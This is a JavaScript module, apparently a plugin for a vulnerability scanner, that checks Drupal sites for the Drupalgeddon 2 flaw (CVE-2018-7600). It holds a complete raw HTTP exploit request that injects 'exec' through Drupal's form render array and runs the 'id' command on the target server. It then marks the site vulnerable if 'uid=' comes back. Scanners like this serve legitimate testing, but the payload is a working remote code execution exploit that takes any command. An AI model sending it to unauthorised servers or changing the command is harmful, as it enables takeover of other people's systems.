module.exports={
	tags:"drupal,web,CVE-2018-7600",
    des:"web,RCE,Drupal Drupalgeddon 2 Remote Code Execution Vulnerability (CVE-2018-7600)",
    dependencies:"",
	VulApps:[],
	urls:["https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600"],
	doCheck:function (url,fnCbk)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        
        try{
            // safe.cgi
            var szPaload = 
            `POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
            Host: ${hst.hostname}:${hst.port}
Accept: */*
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id

`;
            _s.fnSocket(hst.hostname,hst.port,szPaload,function(s)
            {
                var i = 0;
                s = String(s);
                var r = {"url":url,"send":szPaload,result:s};
                if(-1 < (i = s.indexOf("uid=")))
                {
                    r.vul = true;
                    fnCbk(r,_t);
                }
            });
        }catch(e){
            _s.error(e)}
	}
};